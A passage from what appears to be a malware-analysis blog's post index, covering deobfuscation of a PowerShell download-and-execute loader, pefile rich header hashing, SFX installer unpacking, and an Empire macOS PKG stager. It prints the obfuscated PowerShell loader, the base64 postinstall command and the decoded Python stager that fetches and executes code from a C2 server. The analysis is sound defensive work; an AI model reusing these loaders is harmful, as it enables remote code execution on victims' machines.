&#39;Net&#39;+&#39;.@@@@@@@@@@@@@$$$$$$$$$$$$$$$$$&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;t&#39;.Replace(&#39;@@@@@@@@@@@@@$$$$$$$$$$$$$$$$$&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&#39;,&#39;&#39;+&#39;Webc&#39;+&#39;lien&#39;)$2 = &#39;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;~~~~~~~~~~~~~~~~~~okE&#39;.Replace(&#39;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;~~~~~~~~~~~~~~~~~~&#39;,&#39;InV&#39;)$3 = &#39;D&#39;+&#39;o&#39;+&#39;w&#39;+&#39;n&#39;+&#39;l&#39;+&#39;o&#39;+&#39;a&#39;+&#39;d&#39;+&#39;s&#39;+&#39;tri&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;&#39;+&#39;n&#39;+&#39;g&#39;I`EX((n`e`W`-Obj`E`c`T (($1))).(($3)).$2(((&#39;hxxps://raw.githubusercontent[.]com/az3r12/NYAN/main/Server.jpg&#39;)))).Replace(&#39;ooooiiiiiiiiiijhgfghjiugghjllknfderrthbbvccdssgvhhgoooooo&#39;,&#39;ForEach-Object {( [Convert]::ToInt16(([String]$_), 8) -As[Char])});sal g $t0&#39;).Replace(&#39;rxectfyvhgbuyhnikjmmnubyvbgvfcttyghuytvcxetcryvtubyjnhbgvfcdrctvuybvcrxrtyuubvtrcex&#39;,&#39;[Parameter(Mandatory=$true)] [String]$HLH&#39;).Replace(&#39;trdyjtuybiuyminubyvtcrytvybunibuyvtcrxtcytvuybiubihugyftuyiuo&#39;,&#39;New-Object -TypeName byte[] -ArgumentList ($HLH.Length / 2)&#39;).Replace(&#39;fyyfbyfyfjyfjvyhtftdvbytdvtftfbfbytf&#39;,&#39;[Convert]::ToByte($HLH.Substring($i, 2), 16)&#39;).Replace(&#39;trcymtuvybiuyvtcrtcytuyiubyvtcw4gh5djf6g7nbfvdrcsxetcrdytfbygyvcdr&#39;,&#39;{&#39;).Replace(&#39;yuuuuuuuuuuuuuuuuvgggggggggggxddddddddddzswvttttttttt&#39;,&#39;(&#39;).Replace(&#39;mbappebgfvnjjhffgjjufghiolmgfd mbappe&#39;,&#39;)&#39;)In this example, the first three variables contain substrings of Net.Webclient.DownloadString obfuscated using string replacement and a string broken up into individual characters. This indicates PowerShell will download something from a URL. Later in the code there is a URL, so we can reasonably assume the code will download something from it. At the beginning of the final line, an IEX statement is slightly obfuscated using a single character. IEX is shorthand for Invoke-Expression in PowerShell, and we can assume it will execute any code downloaded from the URL.After the IEX there are loads of .Replace() function calls. This is where the adversary manipulates data in their next stage of the chain. Presumably whatever gets executed will have junk code inside, but the junk code is replaced by real, useful code before execution. Once we retrieve the next stage into a text file, we can deobfuscate it using this code:$obfuscated_script = Get-Content ./Server.jpg$deobfuscated_script = $obfuscated_script.Replace(&#39;ooooiiiiiiiiiijhgfghjiugghjllknfderrthbbvccdssgvhhgoooooo&#39;,&#39;ForEach-Object {( [Convert]::ToInt16(([String]$_), 8) -As[Char])});sal g $t0&#39;).Replace(&#39;rxectfyvhgbuyhnikjmmnubyvbgvfcttyghuytvcxetcryvtubyjnhbgvfcdrctvuybvcrxrtyuubvtrcex&#39;,&#39;[Parameter(Mandatory=$true)] [String]$HLH&#39;).Replace(&#39;trdyjtuybiuyminubyvtcrytvybunibuyvtcrxtcytvuybiubihugyftuyiuo&#39;,&#39;New-Object -TypeName byte[] -ArgumentList ($HLH.Length / 2)&#39;).Replace(&#39;fyyfbyfyfjyfjvyhtftdvbytdvtftfbfbytf&#39;,&#39;[Convert]::ToByte($HLH.Substring($i, 2), 16)&#39;).Replace(&#39;trcymtuvybiuyvtcrtcytuyiubyvtcw4gh5djf6g7nbfvdrcsxetcrdytfbygyvcdr&#39;,&#39;{&#39;).Replace(&#39;yuuuuuuuuuuuuuuuuvgggggggggggxddddddddddzswvttttttttt&#39;,&#39;(&#39;).Replace(&#39;mbappebgfvnjjhffgjjufghiolmgfd mbappe&#39;,&#39;)&#39;)Set-Content -Path ./deobfuscated_Server.jpg.ps1 -Value $deobfuscated_scriptIn this particular case we reused the .Replace() function calls to make all the deobfuscation happen automatically rather than doing a manual find and replace operation for each one. This sort of efficiency can add up to a lot of saved time during analysis.Getting More ComplexThe next stage in the chain looks something like this (except with much more hex content):$b1 = &quot;111&quot;$b2 = &quot;105&quot;$b3 = &quot;130&quot;$b4 = &quot;[String]&quot; ; $t0=-Join (($b1, $b2, $b3 )| ForEach-Object {( [Convert]::ToInt16(([String]$_), 8) -As[Char])});sal g $t0$b4=$TC = &quot;4D5A9\\/\\/\\/\\/3...&quot;.replace(&#39;\\/&#39;,&#39;0&#39; )Function HBankers { [CmdletBinding( )] [OutputType([byte[]] )] param( [Parameter(Mandatory=$true)] [String]$HLH ) $HHPPLL = New-Object -TypeName byte[] -ArgumentList ($HLH.Length / 2) for ($i = 0; $i -lt $HLH.Length; $i += 2 ) { $HHPPLL[$i / 2] = [Convert]::ToByte($HLH.Substring($i, 2), 16) } return [byte[]]$HHPPLL}[String]$HL = &#39;4D5A9\\/\\/\\/\\/3...&#39;.replace(&#39;\\/&#39;,&#39;0&#39; ) $A1 = &quot;Ge&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;..............&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;od&quot;.Replace(&#39;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;..............&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&#39;,&#39;tMeth&#39; )$A2 = &quot;g!!!!!!!!!!!!!@@@@@@@@@@@@@@@@################in&quot;.Replace(&#39;!!!!!!!!!!!!!@@@@@@@@@@@@@@@@################&#39;,&#39;et_CurrentDoma&#39; )$A3 = &quot;I@@@@@@@@@@@@@@@&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;..!!!!!!!!!!!!!!!!!!!!!!e&quot;.Replace(&#39;@@@@@@@@@@@@@@@&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;..!!!!!!!!!!!!!!!!!!!!!!&#39;,&#39;nvok&#39; )$A4 = &quot;Lo!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!&quot;.Replace(&#39;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!&#39;,&#39;ad&#39; )$a7 = &quot;$null&quot;$a5 = &#39;[S!!!!!!!!!!!!!!@@@@@@@@@@@@@@!!!!!!!!!!!!!!!!^^^^^^^^^^^^^in]&#39;.Replace(&#39;!!!!!!!!!!!!!!@@@@@@@@@@@@@@!!!!!!!!!!!!!!!!^^^^^^^^^^^^^&#39;,&#39;ystem.AppDoma&#39; ) | g ; $a5.$A1($A2 ).$A3($a7,$null ).$A4([Byte[]](HBankers ($HL ) ) )| g$a8 = &#39;MS&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;.........e&#39;.Replace(&#39;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;.........&#39;,&#39;Build.ex&#39; )[Byte[]]$HH= HBankers $TC[rerup]::qw5f0($a8,$HH )There’s a lot of fun obfuscation in this step of the chain, but I want to focus on two particular components: the hex strings starting with 4D5A. The 4D5A represents a traditional Windows PE header bytes that gets represented as MZ in ASCII. The script is shortened in this post for brevity, but examining it in VirusTotal will show the sample contains almost 200KB of encoded text. In addition, we can see there are two Byte[] array structures used by the code. We can hypothesize that the two hex strings decode into Windows PE files that will eventually be held inside those byte arrays. Now, how can we make that happen?In both the Byte[] array statements, the adversary references the function HBankers(). In addition, the declaration for this function shows it takes string input and outputs a byte array. We can reasonably assume this function performs deobfuscation, so let’s use it to our advantage! We can use portions of the malware in our own script here:[String]$TC = &quot;4D5A9\\/\\/\\/\\/3...&quot;.replace(&#39;\\/&#39;,&#39;0&#39; )[String]$HL = &#39;4D5A9\\/\\/\\/\\/3...&#39;.replace(&#39;\\/&#39;,&#39;0&#39; )Function HBankers { [CmdletBinding( )] [OutputType([byte[]] )] param( [Parameter(Mandatory=$true)] [String]$HLH ) $HHPPLL = New-Object -TypeName byte[] -ArgumentList ($HLH.Length / 2) for ($i = 0; $i -lt $HLH.Length; $i += 2 ) { $HHPPLL[$i / 2] = [Convert]::ToByte($HLH.Substring($i, 2), 16) } return [byte[]]$HHPPLL}[Byte[]]$deobfuscated_bin_1 = HBankers $TC[Byte[]]$deobfuscated_bin_2 = HBankers $HLSet-Content -Path deobfuscated_1.bin -Value $deobfuscated_bin_1 -AsByteStreamSet-Content -Path deobfuscated_2.bin -Value $deobfuscated_bin_2 -AsByteStreamNow we can execute the script and then take a look at the files that get created:PS /home/ForensicITGuy/NYAN&amp;gt; file *.bindeobfuscated_1.bin: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windowsdeobfuscated_2.bin: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS WindowsAnd just like that, we have the PE binary payloads for additional analysis! The HBanker() function contained everything we needed to output a byte array into a variable, and Set-Content provided means for us to write that byte array to disk. Now that we have the files, we can continue analysis in the near future." }, { "title": "Getting PE Rich Header Hashes with pefile in Python", "url": "/rich-header-hashes-with-pefile/", "categories": "blue-team, tools", "tags": "windows, pefile, pe, rich, header, hash, virustotal", "date": "2021-09-02 00:00:00 +0000", "snippet": "If you’ve performed Windows malware analysis using Python tools, you’ve almost certainly worked with the Python pefile library. This library allows analysts to parse, manipulate, and dump information related to Windows Portable Executable (PE) files. Given its prevalence among malware analysis tools, it can also prove useful for threat intelligence folks trying to look for data points to pivot on to find similar malware samples.Malware Similarity via HashesThere are loads of resources talking about calculating hashes that allow you to pivot and find similar samples. Rather than reiterating those points, I’ll just share resources talking about the ones I’ve used the most lately: import table and rich header hashing. https://www.fireeye.com/blog/threat-research/2014/01/tracking-malware-import-hashing.html https://github.com/RichHeaderResearch/RichPE https://www.virusbulletin.com/virusbulletin/2020/01/vb2019-paper-rich-headers-leveraging-mysterious-artifact-pe-format/ https://blog.virustotal.com/2020/11/why-is-similarity-so-relevant-when.html https://www.youtube.com/watch?v=ipPAFG8qtygBy the way, VirusTotal enterprise lets you search for rich header matching using the operator rich_pe_header_hash:, which relies on calculating the MD5 hash of the clear bytes of a rich header.Adding Rich Header Hashing to pefileWhen I started learning about the rich header’s intelligence value and how I could pivot on values in VT, I started wanting to calculate the hash value for all my samples I analyze. I knew that pefile supported getting import table hashes using a get_imphash() function so I assumed it also had functions for rich header hashing… until I found out it didn’t. Several folks (including me) made their own Python scripts to calculate rich header hashes but I thought, “why not just cut out all the extra work and put it in pefile?”Some programming and pull requests later, pefile now has rich header hashing built in with version v2021.9.3!To give it a test run, you can use code like this:import pefilebinary = pefile.PE(&#39;thing.exe&#39;)binary.get_rich_header_hash()By default, the function uses the MD5 hashing algorithm, but you can optionally specify others as strings:.get_rich_header_hash( [ &#39;md5&#39; | &#39;sha1&#39; | &#39;sha256&#39; | &#39;sha512&#39; ])Installing The Updated pefileTo grab the new version, you can use Python’s pip utility:pip install --upgrade pefileHappy hashing!" }, { "title": "Extracting Malicious Payloads from SFX Self-Extracting Installers", "url": "/extracting-sfx-installer/", "categories": "Malware", "tags": "windows, 7zip, sfx, self-extracting, installers", "date": "2021-07-10 00:00:00 +0000", "snippet": "Self-extracting installers are an awesome way to distribute software because they require very little overhead and minimal configuration. Because of this, some malware threats use these SFX files to deploy components to victim systems, and malware analysts need to know how to safely unpack the components for investigation. For this example, we’re going to walk through the process to unpack this malicious installer: https://www.virustotal.com/gui/file/9d27976b21da5fc419da598ea44456a528b9fbf83f24fc5e14f697f610a5b295/detection.The 7zip SFX Executable Format7zip self-extracting installers are indeed Windows Portable Executable files, but they are a specialized format to themselves. To create a SFX file, you need two or three components: 7zip SFX Module (from the LZMA SDK) Installer Configuration Script (optional) 7zip archive containing contentThe SFX module is a minimal Windows PE file designed to execute the contents of the configuration script and extract the archive included in the created SFX file. The configuration script contains plaintext commands in configuration stanzas, and this helps creators kick off specialized installations. Finally, the archive containing content is the actual payload we want to retrieve.These components fit together rather easily when a creator executes copy /b 7z-module.sfx + config.txt + archive.7z installer.exe. The SFX format assumes that all of these components are physically joined together, appended to the same file.This means we can unpack the SFX by looking for the magic header bytes for a 7z archive to retrieve the malicious payloads inside.Unpacking the Malicious ContentTo unpack the content of a SFX file, we can open the file in a hex editor and look for the magic bytes of a 7z archive: 37 7A BC AF 27 1C. Once we find those magic bytes, we can select all the bytes of the file from that header to the end of the file. After selection, we can copy those bytes and paste them into a new file to obtain the malicious payload.Once we’ve created the new payload file from the copied bytes, we can open the file from any archive tool that supports 7z.What About Password Protected SFXs?The same method still works. The only difference is that our ending payload.7z archive will be password protected. If you have the password, it’s trivial to extract from there. If you don’t, get to cracking.Bonus: The Configuration ScriptSince the components of the SFX are physically appended together, this also means that the configuration script can be found as plaintext inside the bytes of the SFX file. To find it, search through instances of !@ until you find text that looks similar to this:!@Something@!UTF-8!...!@SomethingEnd@!" }, { "title": "Analyzing an Empire macOS PKG Stager", "url": "/analyzing-empire-macos-pkg-stager/", "categories": "Malware", "tags": "macOS, Empire, PKG, malware", "date": "2021-02-08 00:00:00 +0000", "snippet": "Command and control (C2) frameworks often support multiple platforms, and PowerShell Empire is no different. In older days, there was a Python Empyre version that eventually merged into the full Empire project and support for macOS and Linux systems still exists within Empire. For these platforms, Empire leverages python-based launchers to execute commands. While the Python launchers may be platform independent, adversaries must still deliver them to victim hosts. This delivery presents an excellent opportunity for detection and analysis. For this example, we’re going to walk through the analysis of an Empire stager found in VirusTotal: https://www.virustotal.com/gui/file/19e19adc03b313236462b30a1a438a604d4c0b4c86268b951689696144a63fdc/detection.Inspecting The PKG FileFor this analysis, we’ll work from a REMnux v7 host. To start off, let’s make sure we have a working folder for files.$ mkdir -p ~/cases/empire-stager/stager$ mv ~/Downloads/discord.pkg empire-stager/$ cd empire-stager/$ ls -lahtotal 48Kdrwxrwxr-x 3 remnux remnux 4.0K Feb 8 23:38 .drwxrwxr-x 9 remnux remnux 4.0K Feb 8 23:37 ..-rw-rw-r-- 1 remnux remnux 35K Feb 7 01:30 discord.pkgdrwxrwxr-x 2 remnux remnux 4.0K Feb 8 23:37 stagerThe PKG file masquerades as a component related to the Discord application, possibly the installer. To proceed we can go ahead and get an idea of the file type using the file command.$ file discord.pkgdiscord.pkg: xar archive compressed TOC: 2674, SHA-1 checksumThe output indicates the PKG file is a XAR archive, exactly what we expect for a PKG file.Moving forward, we can unpack the PKG using bsdtar.$ bsdtar xvf discord.pkg -C stager/x Resourcesx Resources/ru-RU.lprojx Distributionx update.pkgx update.pkg/PackageInfox update.pkg/Bomx update.pkg/Payloadx update.pkg/Scripts$ cd stager/$ ls -lahtotal 20Kdrwxrwxr-x 4 remnux remnux 4.0K Feb 8 23:44 .drwxrwxr-x 3 remnux remnux 4.0K Feb 8 23:38 ..-rw-r--r-- 1 remnux remnux 1.8K Nov 27 2019 Distributiondrwxr-xr-x 3 remnux remnux 4.0K Nov 27 2019 Resourcesdrwxr-xr-x 2 remnux remnux 4.0K Nov 27 2019 update.pkgWithin the Resources folder there is a ru-RU.lproj file. From the naming convention we can hypothesize it has something to do with language resources, but we can’t be sure because the folder is empty upon inspection.Next, we can inspect the contents of the update.pkg folder. As seen in the output of bsdtar, it contains just a few files:$ ls -lahtotal 84Kdrwxr-xr-x 2 remnux remnux 4.0K Nov 27 2019 .drwxrwxr-x 4 remnux remnux 4.0K Feb 8 23:44 ..-rw-r--r-- 1 remnux remnux 35K Nov 27 2019 Bom-rw-r--r-- 1 remnux remnux 777 Nov 27 2019 PackageInfo-rw-r--r-- 1 remnux remnux 29K Nov 27 2019 Payload-rw-r--r-- 1 remnux remnux 917 Nov 27 2019 Scripts$ file *Bom: Mac OS X bill of materials (BOM) filePackageInfo: ASCII textPayload: gzip compressed data, from Unix, original size modulo 2^32 77824Scripts: gzip compressed data, from Unix, original size modulo 2^32 1536From the directory structure and file types, it seems the contents match what we would expect from a macOS PKG file. There is a Bill of Materials (BOM) file, PackageInfo in text/XML format, and two gzipped CPIO archives: Payload and Scripts. Before unpacking the Payload and Scripts, we can inspect the PackageInfo file with less.$ less PackageInfo&amp;lt;pkg-info format-version=&quot;2&quot; identifier=&quot;com.apple.Discord&quot; version=&quot;1.0&quot; install-location=&quot;/&quot; auth=&quot;root&quot; overwrite-permissions=&quot;true&quot; generator-version=&quot;InstallCmds-554 (15G31)&quot;&amp;gt; &amp;lt;payload numberOfFiles=&quot;15&quot; installKBytes=&quot;105&quot;/&amp;gt; &amp;lt;scripts&amp;gt; &amp;lt;postinstall file=&quot;./postinstall&quot;/&amp;gt; &amp;lt;/scripts&amp;gt; &amp;lt;bundle id=&quot;com.apple.Discord&quot; CFBundleIdentifier=&quot;com.apple.Discord&quot; path=&quot;./Discord.app&quot; CFBundleShortVersionString=&quot;1.0&quot; CFBundleVersion=&quot;1&quot;/&amp;gt; &amp;lt;bundle-version&amp;gt; &amp;lt;bundle id=&quot;com.apple.Discord&quot;/&amp;gt; &amp;lt;/bundle-version&amp;gt; &amp;lt;upgrade-bundle&amp;gt; &amp;lt;bundle id=&quot;com.apple.Discord&quot;/&amp;gt; &amp;lt;/upgrade-bundle&amp;gt; &amp;lt;update-bundle/&amp;gt; &amp;lt;atomic-update-bundle/&amp;gt; &amp;lt;strict-identifier&amp;gt; &amp;lt;bundle id=&quot;com.apple.Discord&quot;/&amp;gt; &amp;lt;/strict-identifier&amp;gt;&amp;lt;/pkg-info&amp;gt;There are a few things to note from this file. First, the PackageInfo file doubles down on the masquerade that the PKG file is related to Discord. Next, the installKBytes field contains a value 105. This gives us reasonable evidence to assume the Payloads archive will contain some form of content. In payload-free package files, the installKBytes field will contain the value 0, indicating all the work is done by preinstall and postinstall scripts.Finally, the scripts section of the PackageInfo file indicates we can expect Scripts to unpack a postintall script for execution. This postinstall script should execute after the macOS Installer utility processes the content of the PKG file and after the “installation” is complete. In legitimate use cases, applications would take this opportunity to use postinstall scripts to clean up unneeded files. In this case, the postinstall script executes malware.Unpacking the Malicious ContentNow we can unpack the Payload and Scripts archives.$ cat Payload | gunzip | cpio -i152 blocks$ cat Scripts | gunzip | cpio -i3 blocks$ ls -lahtotal 92Kdrwxr-xr-x 3 remnux remnux 4.0K Feb 9 00:01 .drwxrwxr-x 4 remnux remnux 4.0K Feb 8 23:44 ..drwxr-xr-x 3 remnux remnux 4.0K Feb 9 00:01 Applications-rw-r--r-- 1 remnux remnux 35K Nov 27 2019 Bom-rw-r--r-- 1 remnux remnux 777 Nov 27 2019 PackageInfo-rw-r--r-- 1 remnux remnux 29K Nov 27 2019 Payload-rwxr-xr-x 1 remnux remnux 1.1K Feb 9 00:01 postinstall-rw-r--r-- 1 remnux remnux 917 Nov 27 2019 Scripts$ file postinstall postinstall: Bourne-Again shell script, ASCII text executable, with very long linesNow the postinstall script is unpacked, we can recognize its file type as a Bash script. This is important to note as a postinstall script can be written in any scripting language for which the system contains an interpreter. In some packages, I’ve also seen postinstall to be a Mach-O binary instead of a script. To see the contents of postinstall, we can use the less command again.$ less postinstall#!/bin/bashecho &quot;import sys,base64,warnings;warnings.filterwarnings(&#39;ignore&#39;);exec(base64.b64decode(&#39;aW1wb3J0IHN5cztpbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xNzYuMTI2LjcwLjEzMjoxMDAwMSc7dD0nL2xvZ2luL3Byb2Nlc3MucGhwJztyZXE9dXJsbGliMi5SZXF1ZXN0KHNlcnZlcit0KTsKcmVxLmFkZF9oZWFkZXIoJ1VzZXItQWdlbnQnLFVBKTsKcmVxLmFkZF9oZWFkZXIoJ0Nvb2tpZScsInNlc3Npb249cUc5WlFZWFdlMEk1cG15dFpFMU4wdkFxbTljPSIpOwpwcm94eSA9IHVybGxpYjIuUHJveHlIYW5kbGVyKCk7Cm8gPSB1cmxsaWIyLmJ1aWxkX29wZW5lcihwcm94eSk7CnVybGxpYjIuaW5zdGFsbF9vcGVuZXIobyk7CmE9dXJsbGliMi51cmxvcGVuKHJlcSkucmVhZCgpOwpJVj1hWzA6NF07ZGF0YT1hWzQ6XTtrZXk9SVYrJzBlZjk2NzMyNzg5NzE4NTI1ZTc2MzgyOTM3MGJkNDg4JztTLGosb3V0PXJhbmdlKDI1NiksMCxbXQpmb3IgaSBpbiByYW5nZSgyNTYpOgogICAgaj0oaitTW2ldK29yZChrZXlbaSVsZW4oa2V5KV0pKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KaT1qPTAKZm9yIGNoYXIgaW4gZGF0YToKICAgIGk9KGkrMSklMjU2CiAgICBqPShqK1NbaV0pJTI1NgogICAgU1tpXSxTW2pdPVNbal0sU1tpXQogICAgb3V0LmFwcGVuZChjaHIob3JkKGNoYXIpXlNbKFNbaV0rU1tqXSklMjU2XSkpCmV4ZWMoJycuam9pbihvdXQpKQ==&#39;));&quot; | /usr/bin/python &amp;amp;exit 0The postinstall script contains base64-encoded Python commands. We know they’re base64-encoded because they’ll be decoded at runtime using the functions base64.b64decode and executed with exec. In addition, the stager uses an echo command to pass the code into a python process. This is an evasion method, ensuring that process monitoring software such as EDR won’t notice Python having suspicious command line parameters. Since the code is in base64, we can easily decode it with the command base64 -d and write it to a plaintext file.$ echo &quot;aW1wb3J0IHN5cztpbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xNzYuMTI2LjcwLjEzMjoxMDAwMSc7dD0nL2xvZ2luL3Byb2Nlc3MucGhwJztyZXE9dXJsbGliMi5SZXF1ZXN0KHNlcnZlcit0KTsKcmVxLmFkZF9oZWFkZXIoJ1VzZXItQWdlbnQnLFVBKTsKcmVxLmFkZF9oZWFkZXIoJ0Nvb2tpZScsInNlc3Npb249cUc5WlFZWFdlMEk1cG15dFpFMU4wdkFxbTljPSIpOwpwcm94eSA9IHVybGxpYjIuUHJveHlIYW5kbGVyKCk7Cm8gPSB1cmxsaWIyLmJ1aWxkX29wZW5lcihwcm94eSk7CnVybGxpYjIuaW5zdGFsbF9vcGVuZXIobyk7CmE9dXJsbGliMi51cmxvcGVuKHJlcSkucmVhZCgpOwpJVj1hWzA6NF07ZGF0YT1hWzQ6XTtrZXk9SVYrJzBlZjk2NzMyNzg5NzE4NTI1ZTc2MzgyOTM3MGJkNDg4JztTLGosb3V0PXJhbmdlKDI1NiksMCxbXQpmb3IgaSBpbiByYW5nZSgyNTYpOgogICAgaj0oaitTW2ldK29yZChrZXlbaSVsZW4oa2V5KV0pKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KaT1qPTAKZm9yIGNoYXIgaW4gZGF0YToKICAgIGk9KGkrMSklMjU2CiAgICBqPShqK1NbaV0pJTI1NgogICAgU1tpXSxTW2pdPVNbal0sU1tpXQogICAgb3V0LmFwcGVuZChjaHIob3JkKGNoYXIpXlNbKFNbaV0rU1tqXSklMjU2XSkpCmV4ZWMoJycuam9pbihvdXQpKQ==&quot; | base64 -d &amp;gt; python-stager.txtAnalyzing The Python Code$ less python-stager.txtimport sys;import urllib2;UA=&#39;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&#39;;server=&#39;hxxp://176.126.70[.]xxx:10001&#39;;t=&#39;/login/process.php&#39;;req=urllib2.Request(server+t);req.add_header(&#39;User-Agent&#39;,UA);req.add_header(&#39;Cookie&#39;,&quot;session=qG9ZQYXWe0I5pmytZE1N0vAqm9c=&quot;);proxy = urllib2.ProxyHandler();o = urllib2.build_opener(proxy);urllib2.install_opener(o);a=urllib2.urlopen(req).read();IV=a[0:4];data=a[4:];key=IV+&#39;0ef96732789718525e763829370bd488&#39;;S,j,out=range(256),0,[]for i in range(256): j=(j+S[i]+ord(key[i%len(key)]))%256 S[i],S[j]=S[j],S[i]i=j=0for char in data: i=(i+1)%256 j=(j+S[i])%256 S[i],S[j]=S[j],S[i] out.append(chr(ord(char)^S[(S[i]+S[j])%256]))exec(&#39;&#39;.join(out))While inspecting the Python code, we can note a few things for leads. First, the C2 server for this implant is at 176.126.70.xxx (intentionally redacted) on port 10001 listening for the HTTP protocol. When visiting the C2 server for commands, the code will request a URI path of /login/process.php using a user-agent string of Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko. Both of these details help Empire’s network traffic masquerade as legitimate traffic in an enterprise network.With this cleartext code, we can easily attribute the code to Empire with code publicly available on GitHub. In this case, the Python code comes from this file in the former, archived Empire repository: https://github.com/EmpireProject/Empire/blob/master/lib/listeners/http.py#L413.The PKG stager packaging is also in the repository here: https://github.com/EmpireProject/Empire/blob/master/lib/common/stagers.py#L404.Does The App Even Do Anything?From here we’re certain the PKG file contains an Empire stager, but it could also potentially contain legitimate functionality related to Discord. We can rule that out by investigating the rest of the PKG contents.$ cd Applications/Discord.app/$ tree -a.└── Contents ├── _CodeSignature │   └── CodeResources ├── Info.plist ├── MacOS │   └── Discord ├── PkgInfo └── Resources ├── Base.lproj │   └── MainMenu.nib └── Scatter.icns5 directories, 6 filesUsing the tree command, we can inspect the folder structure without all the laborious ls commands. Within macOS application bundles, the main executable of interest typically lives in the Contents/MacOS folder. In this case, it’s named Discord.$ cd Contents/MacOS/$ file Discord Discord: Mach-O 64-bit x86_64 executable, flags:&amp;lt;NOUNDEFS|DYLDLINK|TWOLEVEL|PIE&amp;gt;From the output of file we know that Discord is definitely a Mach-O executable binary. We’re not going to fully reverse the binary, but we can get some additional evidence by simply running strings to see if we can identify suspicious binary contents. First, we’ll run strings to get standard ASCII characters into a file. Then, we’ll re-run strings again, targeting the Unicode characters.$ strings Discord &amp;gt; discord.strings.txt$ strings -el Discord &amp;gt;&amp;gt; discord.strings.txt $ less discord.strings.txt__PAGEZERO__TEXT__text__TEXT__const__TEXT__unwind_info__TEXT__DATA__objc_imageinfo__DATA__LINKEDIT/usr/lib/dyld/System/Library/Frameworks/Python.framework/Versions/2.7/Python/System/Library/Frameworks/Foundation.framework/Versions/C/Foundation/usr/lib/libobjc.A.dylib/usr/lib/libSystem.B.dylib@(#)PROGRAM:templateMachoExe PROJECT:templateMachoExe-_mh_execute_header:main&amp;gt;templateMachoExeVersionStringUNumber__mh_execute_header_main_templateMachoExeVersionNumber_templateMachoExeVersionStringdyld_stub_bindertemplateMachoExe-555549440018c666ecdc32b59bfb39f5a574c24dPC^ttemplateMachoExe-555549440018c666ecdc32b59bfb39f5a574c24d@DxGIt’s not common to see a functional binary quite this lean in strings. In fact, there doesn’t appear to be anything in the binary specifically relevant to Discord in any way. An additional lead to investigate is the string templateMachoExe present in the strings output. This string could indicate the binary is a generic copy of the template Mach-O file contained with Empire. To find out for sure, you can download the template file and run strings against it to compare the output.Hopefully this helps illustrate how Empire stagers work on macOS, thanks for reading!" }, { "title": "How Qbot Uses Esentutl", "url": "/how-qbot-uses-esentutl/", "categories": "Malware", "tags": "qbot, malware, esentutil", "date": "2021-02-01 00:00:00 +0000", "snippet": "A 